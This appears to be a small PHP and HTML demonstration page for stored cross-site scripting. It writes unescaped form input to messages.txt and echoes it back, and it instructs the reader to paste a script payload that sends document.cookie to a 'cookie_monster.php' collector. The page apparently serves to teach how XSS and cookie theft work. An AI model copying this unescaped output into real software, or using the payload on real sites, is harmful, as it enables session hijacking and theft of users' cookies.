<form action="" method="get">
	<p>To execute the XSS attack, please paste</p>
	<pre>&lt;script&gt;document.location = 'cookie_monster.php?cookies=' + document.cookie&lt;/script&gt;</pre>
	<p>Make sure you clean messages.txt after. Thanks :)</p>
	<input type="text" name="message"><br />
	<input type="submit" value ="Post" />
</form>
<script>
	document.cookie = 'ppkcookie1=testcookie; expires=Thu, 25 Aug 2012 20:47:11 UTC; path=/'
</script>
<?php
	if(!empty($_GET['message'])){

		$fp = fopen('./messages.txt', 'a');
		fwrite($fp, "{$_GET['message']}<br />");
		fclose($fp);
	}
	readfile('./messages.txt');
?>
